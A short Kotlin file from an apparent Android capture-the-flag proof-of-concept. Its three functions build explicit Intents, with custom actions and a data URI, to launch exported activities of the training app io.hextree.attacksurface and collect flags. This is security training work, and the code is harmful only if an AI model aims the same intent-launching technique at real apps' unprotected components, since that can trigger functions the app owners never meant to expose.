package com.vishal2376.hextreepoc

import android.content.Context
import android.content.Intent
import androidx.core.net.toUri

/**
 * Author: Vishal Singh (vishal2376)
 */

class Attack(private val context: Context) {

	private val packageName = "io.hextree.attacksurface"

	fun flag1() {
		val activityPath = "io.hextree.attacksurface.activities.Flag1Activity"

		val intent = Intent()
		intent.setClassName(packageName, activityPath)
		context.startActivity(intent)

		Utils.dumpIntent(context, intent, title = "Flag 1 Intent")
	}

	fun flag2() {
		val activityPath = "io.hextree.attacksurface.activities.Flag2Activity"
		val customAction = "io.hextree.action.GIVE_FLAG"

		val intent = Intent()
		intent.setClassName(packageName, activityPath)
		intent.action = customAction

		Utils.dumpIntent(context, intent, title = "Flag 2 Intent")

		context.startActivity(intent)
	}

	fun flag3() {
		val activityPath = "io.hextree.attacksurface.activities.Flag3Activity"
		val customAction = "io.hextree.action.GIVE_FLAG"
		val customUri = "https://app.hextree.io/map/android".toUri()

		val intent = Intent()
		intent.setClassName(packageName, activityPath)
		intent.action = customAction
		intent.data = customUri

		Utils.dumpIntent(context, intent, title = "Flag 3 Intent")

		context.startActivity(intent)
	}
}
